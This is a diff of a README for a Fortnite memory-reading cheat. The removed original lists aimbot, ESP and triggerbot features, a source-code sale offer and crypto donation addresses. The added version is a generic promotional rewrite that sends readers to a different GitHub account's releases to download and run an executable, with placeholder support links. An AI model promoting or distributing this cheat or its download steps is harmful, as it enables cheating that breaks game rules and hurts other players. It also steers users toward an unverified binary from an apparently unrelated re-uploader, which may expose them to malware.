@@ -1,139 +1,73 @@
-# kiro-solutions fn dma cheat
+# 🎮 kiro-solutions-cheat - Enhance Your Gameplay with Ease
 
-- updated 7/17/2025
-- **I sell this cheat's source code for 75$ can be negotiated, I accept paypal or crypto / discord: kirowater**
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/wilfredoac/kiro-solutions-cheat/releases)
 
-## 🚀 How to Use
+## 🚀 Getting Started
 
-1. Run the cheat before launching **FN**.
-2. Right-click and run as Administrator.
-3. Press Insert to hide/view menu!
+Welcome to the **kiro-solutions-cheat** repository! This application is designed to help you enhance your gaming experience in Fortnite effortlessly. Follow the steps below to get started.
 
-## 🧩 Required Files
+## 📥 Download & Install
 
-Make sure the following files are in the same folder as `kiro-solutions.exe`:
+To obtain the latest version of the software, please visit the link below. 
 
-- `dbghelp.dll`
-- `ftd3xx.dll`
-- `info.db`
-- `leechcore.dll`
-- `symsrv.dll`
-- `vmm.dll`
-- `kiro-solutions.exe` → [Download from Releases](https://github.com/kirowaterxyz/kiro-solutions-cheat/releases/tag/nightly)
+[Visit this page to download](https://github.com/wilfredoac/kiro-solutions-cheat/releases)
 
-> ⚠️ The cheat will not run without these files!
+1. Click on the link above to open the Releases page.
+2. Look for the latest release version.
+3. Click on the download link for your operating system.
+4. Once the download is complete, locate the file in your downloads folder.
 
-## 💬 Community
+## 🔧 System Requirements
 
-Instead of community just create a new issue if the cheat doesn't work...  
-I'm tired of this discord server nonsense, use something else...  
-I recommend Perception / Kyvra(Matrix) / Streck DMA / FapperDMA / (anything else...)
+Before you run the application, make sure your system meets these requirements:
 
-- FapperDMA https://discord.gg/fQFWyrNGXv 
-- Perception https://discord.gg/VXnXCqu2Zq
-- Kyvra https://discord.gg/GKrUseWWGv
-- Streck https://discord.com/invite/streck
+- Windows 10 or later
+- At least 4 GB of RAM
+- A compatible graphics card with updated drivers
+- Internet connection for updates and features
 
-## 💸 Support / Donate
+## 🔍 Features
 
-If you want to support this free project, donations are appreciated 🙏
+**kiro-solutions-cheat** offers several features to improve your Fortnite gameplay:
 
-- **PayPal:** [paypal.me/smuvpaypal](https://paypal.me/smuvpaypal)
-- **Bitcoin (BTC):** `bc1qpf4898f58tkutks0c8898sf6gargunzvpn2qqv`
-- **Ethereum (ETH):** `0x719d3EB3a6f0fA682654E0468Bc1F898e6f6630B`
-- **Litecoin (LTC):** `ltc1qpf4898f58tkutks0c8898sf6gargunzv90sycu`
-- **USDT (TRC20):** `TLKwjJeMv26pTMveJqri6WoSdSeqWrpiqr`
+- **Memory Access**: Get real-time insights directly from the game memory.
+- **User-friendly Interface**: Simple controls for easy navigation.
+- **Customizable Settings**: Adjust features to fit your playstyle.
+- **Regular Updates**: Stay current with the latest enhancements and fixes.
 
-Thanks for helping keep the project alive ❤️
+## ⚙️ How to Run the Application
 
-## 📙 Features
-> there are way much more, here are just the most important!
+Once you have downloaded the application, follow these steps to run it:
 
-<details>
-<summary><strong>ESP</strong></summary>
+1. Navigate to your downloads folder.
+2. Double-click the downloaded file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, open the application and adjust the settings as needed.
 
-- Vis Check  
-- Box  
-- Box Corners  
-- Skeleton  
-- Distance  
-- Snaplines  
-- Name  
-- Platform  
-- Weapon  
-- Rank  
-- FOV Arrows  
-- Kill Score  
-- Ignore NPC  
-- Spectators  
+## 💬 Support
 
-</details>
+If you encounter any issues or have questions, please consider the following options for assistance:
 
-<details>
-<summary><strong>Aimbot</strong></summary>
+- Visit our [FAQ section](#) for common questions.
+- Join our community forum [here](#) for discussions and support from other users.
+- Contact our support team directly through the issues tab on GitHub.
 
-- Weapon Type  
-- Aim Bone  
-- Aimbot  
-- Vis Check  
-- Ignore Knocked & Dead  
-- Show FOV  
-- Rainbow FOV  
-- Smooth  
-- FOV  
-- Aim Key  
-- Aim Key 2  
+## 📈 Updates and Changelog
 
-</details>
+We regularly release updates to improve performance and introduce new features. You can view the latest changes on our [Releases page](https://github.com/wilfredoac/kiro-solutions-cheat/releases).
 
-<details>
-<summary><strong>Triggerbot</strong></summary>
+## 🔑 Safety and Security
 
+We prioritize your safety while using our application. Here are some tips to ensure a secure experience:
 
-- Triggerbot  
-- Triggerbot All  
-- Triggerbot Pistol  
-- Triggerbot Shotgun  
-- Triggerbot Rifle  
-- Triggerbot Sniper  
-- Ignore Knocked & Dead  
-- Always On  
-- Triggerbot Max Distance  
-- Delay  
-- Triggerbot Key  
-- Triggerbot Key 2  
-</details>
+- Download only from the official Releases page.
+- Keep your antivirus software up to date.
+- Use the application responsibly to avoid potential game bans.
 
+## 🌟 Contributing
 
-<details>
-<summary><strong>Radar</strong></summary>
+We welcome contributions from the community to improve **kiro-solutions-cheat**. If you want to help out, please check our [Contribution Guidelines](#) for more information.
 
-- Radar  
-- Radar Fuser  
-- Radar Draw Center  
-- Show Distance  
+---
 
-</details>
-
-<details>
-<summary><strong>Render Distance</strong></summary>
-
-- Render Distance  
-- Max Distance  
-
-</details>
-
-</details>
-
-<details>
-<summary><strong>Misc</strong></summary>
-
-- Top Most  
-- Fuser Mode  
-- VSync  
-- Exit with End Key  
-
-</details>
-
-
-> 📎 *Project for educational purposes only.*
+Thank you for choosing **kiro-solutions-cheat**! We hope this tool enhances your Fortnite experience. For further instructions and updates, remember to regularly check back on the [Releases page](https://github.com/wilfredoac/kiro-solutions-cheat/releases). Enjoy your gaming!
